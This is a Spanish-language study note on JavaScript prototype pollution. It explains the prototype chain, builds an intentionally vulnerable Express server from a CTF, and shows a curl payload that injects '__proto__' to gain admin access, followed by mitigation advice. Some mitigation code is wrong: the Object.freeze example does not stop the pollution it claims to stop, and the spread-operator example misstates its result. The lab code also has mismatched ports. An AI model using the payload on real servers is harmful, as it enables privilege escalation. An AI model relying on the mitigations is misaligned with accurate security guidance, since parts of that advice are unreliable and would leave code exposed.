# PROTOTYPE POLLUTION

## Que es el prototype pollution attack?

es un ataque de inyección que se dirige a los tiempos de ejecución de JavaScript. Con la contaminación de prototipos, un atacante podría controlar los valores predeterminados de las propiedades de un objeto. Esto permite que el atacante altere la lógica de la aplicación y también puede conducir a la denegación de servicio o, en casos extremos, a la ejecución remota de código.

![[Pasted image 20230424221806.png]]

>[!note]
>**En JavaScript del lado del cliente, esto comúnmente conduce a DOM XSS, mientras que la contaminación del prototipo del lado del servidor puede incluso resultar en la ejecución remota de código.**

## ¿Cómo surgen las vulnerabilidades de Prototype Pollution?

Las vulnerabilidades de contaminación de prototipos suelen surgir cuando una función de JavaScript **fusiona recursivamente un objeto** que contiene propiedades controlables por el usuario en un objeto existente, sin desinfectar primero las claves.

La explotación exitosa de la contaminación prototipo requiere los siguientes componentes clave:

- **Una fuente de contaminación de prototipo:** esta es cualquier entrada que le permite envenenar objetos de prototipo con propiedades arbitrarias.
- **Un sink:** en otras palabras, una función de JavaScript o un elemento DOM que permite la ejecución de código arbitrario. 
- **Un dispositivo explotable:** esta es cualquier propiedad que se pasa a un sink sin el filtrado o la desinfección adecuados.

## Fuentes de contaminación

Una fuente de contaminación prototipo es cualquier entrada controlable por el usuario que le permite agregar propiedades arbitrarias a los objetos prototipo. Las fuentes más comunes son las siguientes:

-   La URL a través de la cadena de consulta o fragmento (hash)
-   Entrada basada en JSON
-   Mensajes web

## Prototypes Javascript

- [[Objeto __proto__]]

Los prototipos son el mecanismo por el cual los objetos de JavaScript heredan características unos de otros.

creemos un objeto de javascript para entender mejor:

```javascript
const myObject = {
  city: 'Madrid',
  greet() {
    console.log(`Greetings from ${this.city}`);
  }
}

myObject.greet(); // Greetings from Madrid
```

Este es un objeto con una propiedad de datos city, y un método, greet(). Si escribe el nombre del objeto seguido de un punto en la consola, como myObject., la consola mostrará una lista de todas las propiedades disponibles para este objeto. ¡Verás que, además de cityy greet, hay muchas otras propiedades!

llamamos al objeto

```javascript
myObject
```

vamos a ver una estructura similar a esta:

```javascript
{city: 'Madrid', greet: ƒ}
city: "Madrid"
greet: ƒ greet()
[[Prototype]]: Object
constructor: ƒ Object()
hasOwnProperty: ƒ hasOwnProperty()
isPrototypeOf: ƒ isPrototypeOf()
propertyIsEnumerable: ƒ propertyIsEnumerable()
toLocaleString: ƒ toLocaleString()
toString: ƒ toString()
valueOf: ƒ valueOf()
__defineGetter__: ƒ __defineGetter__()
__defineSetter__: ƒ __defineSetter__()
__lookupGetter__: ƒ __lookupGetter__()
__lookupSetter__: ƒ __lookupSetter__()
__proto__: (...)
get __proto__: ƒ __proto__()
set __proto__: ƒ __proto__()
```

si intentamos a acceder a uno de ellos: 

```javascript
myObject.toString(); // "[object Object]"
```

Funciona, entonces 

## ¿Cuáles son estas propiedades adicionales y de dónde vienen?

Cada objeto en JavaScript tiene una propiedad incorporada, que se llama prototipo . El prototipo es en sí mismo un objeto, por lo que el prototipo tendrá su propio prototipo, formando lo que se llama una cadena de prototipos . La cadena termina cuando llegamos a un prototipo que tiene null por prototipo propio.

Cuando intenta acceder a una propiedad de un objeto: si la propiedad no se puede encontrar en el objeto en sí, se busca la propiedad en el prototipo. Si aún no se puede encontrar la propiedad, se busca el prototipo del prototipo, y así sucesivamente hasta que se encuentra la propiedad o se llega al final de la cadena, en cuyo caso undefinedse devuelve.

Entonces, cuando llamamos myObject.toString(), el navegador:

- busca toStringenmyObject
- no puede encontrarlo allí, por lo que busca en el objeto prototipo de myObjectfortoString
- lo encuentra allí, y lo llama.

entonces si creamos un objeto vacio:

```javascript
const a = {};
console.log(typeof a.__proto__); //object
```

Si intentamos acceder a un atributo que no existe en un objeto, JavaScript buscará en el prototipo del objeto para obtener el valor de ese atributo. Para ver esto, ejecute el fragmento de código. Aunque **a** es un objeto vacío y no se define **someFunction** explícitamente, aún podemos llamar **someFunction** de **a** después de definir la función en el prototipo de **a**.

```javascript
const a = {}; //objeto vacio
a.__proto__.someFunction = function () { //creamos funcion en el prototipo del objeto
  console.log("Hello from the prototype!")
};

//lo llamamos directamente del objeto, como si lo hubieramos creado ahi
a.someFunction(); //Hello from the prototype!
```

Entonces, ¿dónde está el riesgo asociado con los prototipos? Bueno, aquí viene la parte crítica. ¡La mayoría de los objetos comparten el mismo prototipo (predeterminado)!

Por ejemplo, todos los objetos creados mediante el literal **{}** o el constructor **new Object()** compartirán el mismo prototipo a menos que lo anulemos explícitamente. Considere nuestro fragmento de código. **a** y **b** son objetos no relacionados, pero sus atributos ** __proto__**  apuntan al mismo objeto.

```javascript
const a = {};
const b = new Object();
console.log(a.__proto__ === b.__proto__); //true
```

¿Qué cree que sucederá si comenzamos a configurar o actualizar los atributos en un objeto prototipo compartido? Considere el fragmento de código. **a** y **b** no tienen conexión directa pero comparten el mismo prototipo. Como resultado, cambiar el prototipo de **a** afecta **b**!

```javascript
const a = {};
const b = new Object();
a.__proto__.x = 1337;
console.log(b.x); //1337
```

## Vuln Lab

Creemos un servidor vulnerable con nodejs:

```javascript
'use strict';

const express = require('express');
const bodyParser = require('body-parser')
const cookieParser = require('cookie-parser');
const path = require('path');


const isObject = obj => obj && obj.constructor && obj.constructor === Object;

function merge(a, b) {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}

function clone(a) {
    return merge({}, a);
}

// Constants
const PORT = 8080;
const HOST = '0.0.0.0';
const admin = {};

// App
const app = express();
app.use(bodyParser.json())
app.use(cookieParser());

app.use('/', express.static(path.join(__dirname, 'views')));
app.post('/signup', (req, res) => {
    var body = JSON.parse(JSON.stringify(req.body));
    var copybody = clone(body)
    if (copybody.name) {
        res.cookie('name', copybody.name).json({
            "done": "cookie set"
        });
    } else {
        res.json({
            "error": "cookie not set"
        })
    }
});
app.get('/getFlag', (req, res) => {
    var аdmin = JSON.parse(JSON.stringify(req.cookies))
    //por si no da del repo
    
    /*
    var isAdmin=admin.аdmin
    if (isAdmin == 1) {
        res.send("hackim19{Prototype_for_the_win}");
    } else {
        res.send("You are not authorized");
    }*/
    if (admin.аdmin == 1) {
        res.send("hackim19{Prototype_for_the_win}");
    } else {
        res.send("You are not authorized");
    }
});
app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);
```

aqui el problema es la funcion merge():

```javascript

//copia recursivamente cada atributo de un objeto a otro, TODO! hasta el __constructor__ y el __proto__

function merge(a, b) {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}
```

la ruta **/signup** recibe del body una estructura JSON que definamos sin validar la entrada. Todo lo que entre lo clona a un objeto vacio **{}**, recordemos que este tipo de asignacion comparte todos el mismo prototipo. Como el objeto **admin** esta definido de igual manera, todo lo que pasemos en el ** __proto__** de la entrada JSON, pasara al objeto **admin**.

la ruta **/getFlag** recibe en el objeto **admin** la entrada de la cookies que le pasemos y verifica un atributo llamado **admin** que sea igual a **1** (define que eres administrador), no importa que pasemos en las cookies en esta ruta, lo importante es pasar el atributo **admin** junto con ** __proto__** en la ruta **/signup** y eso se guardara tambien en en el objeto **admin**.

entonces explotemos:

```bash
curl -vv --header 'Content-type: application/json' -d '{"__proto__": {"admin": 1}}' 'http://0.0.0.0:4000/signup'
```

con esto y como se hereda lo declarado en un objeto con **{}**, el objeto **admin** tendra tambien el valor **admin=1**

```javascript
admin.admin; //1
```

por lo que ahora si solicitamos la flag, tenemos el nivel de acceso como administrador:

```bash
curl -vv 'http://0.0.0.0:4000/getFlag'

//hackim19{}
```

## mitigaciones

### utilice bibliotecas de código abierto seguras cuando establezca de forma recursiva las propiedades del objeto.

Siempre asegúrese de desinfectar la entrada que no es de confianza cuando establezca propiedades anidadas de forma recursiva. ¡No hagas esto tú mismo! Incluso los mejores desarrolladores pueden equivocarse fácilmente. En su lugar, use una biblioteca como lodash , que es extremadamente popular y tiene un excelente soporte de la comunidad y un historial de solución rápida de problemas de seguridad.

Un prototipo de mitigación de la contaminación, en el que un hacker intenta enviar una entrada maliciosa, pero se utiliza una función **safeMerge** que evita que la entrada maliciosa afecte al prototipo.

```javascript
import safeMerge from 'lodash.merge'

safeMerge(userData, requestBody);
```

### Crear objetos sin prototipos: Object.create(null)

Otra forma de evitar prototype pollution es considerar usar el método **Object.create()** en lugar del objeto literal **{}** o el constructor de objetos **new Object()** al crear nuevos objetos. De esta manera, podemos establecer el prototipo del objeto creado directamente a través del primer argumento pasado a **Object.create()**. Si pasamos null, el objeto creado no tendrá prototipo y por lo tanto no podrá ser contaminado. 

```javascript
const saveToDatabase = Object.create(null);
console.log(saveToDatabase);
merge(saveToDatabase, userData);
merge(saveToDatabase, requestBody);
```

### Congelar el método Object.prototype

Object.freeze() podría congelar un objeto para que ya no se pueda modificar.

```javascript
const casa = {};
Object.freeze(casa);
    
casa.__proto__.toString = ()=>{alert('hola')};

casa.toString(); //no pasa nada
```

### Validación de esquema de entrada JSON

Al analizar la entrada del usuario, validar el esquema JSON podría filtrar valores clave de propiedad confidenciales. Muchas bibliotecas npm ofrecen amplias funciones para validar esquemas JSON o rechazar atributos innecesarios en objetos JSON.

### Evite la fusión recursiva no segura

Durante la fusión de objetos, garantice un funcionamiento seguro omitiendo las propiedades confidenciales. puede usar **safeMerge** de lodash. No use funciones vulnerables como **assign()**.

Por curiosidad, descubrí que tanto el operador de propagación como el Object.assign()método también son vulnerables al ataque de contaminación de prototipos. Por lo tanto, debemos tener cuidado al usar estas dos formas de fusionar objetos.

```javascript
var userInput = JSON.parse('{"__proto__": {"admin": true}}')
var a = {...userInput}
console.log(a.admin)
// true

var b = Object.assign({}, userInput)
console.log(b.admin)
// true
```

### Usar mapa en lugar de objeto

Map se introdujo en ES6. La estructura de datos del mapa almacena pares clave/valor y no es susceptible a la contaminación del prototipo de objeto. Cuando se necesita una estructura clave/valor, se debe preferir Map a Object.

```javascript
const map1 = new Map();

map1.set('a', 1);
map1.set('b', 2);
map1.set('c', 3);

console.log(map1.get('a'));
// expected output: 1

map1.set('a', 97);

console.log(map1.get('a'));
// expected output: 97

console.log(map1.size);
// expected output: 3

map1.delete('b');

console.log(map1.size);
// expected output: 2
```

## fuente

[https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/](https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/)
[https://codeburst.io/what-is-prototype-pollution-49482fc4b638](https://codeburst.io/what-is-prototype-pollution-49482fc4b638)
[https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html#shell-as-root-in-default](https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html#shell-as-root-in-default)
[https://learn.snyk.io/lessons/prototype-pollution/javascript/](https://learn.snyk.io/lessons/prototype-pollution/javascript/)
[https://github.com/nullcon/hackim-2019/tree/master/web/proto](https://github.com/nullcon/hackim-2019/tree/master/web/proto)
[https://medium.com/@andrea.chiarelli/is-javascript-a-true-oop-language-c87c5b48bdf0](https://medium.com/@andrea.chiarelli/is-javascript-a-true-oop-language-c87c5b48bdf0)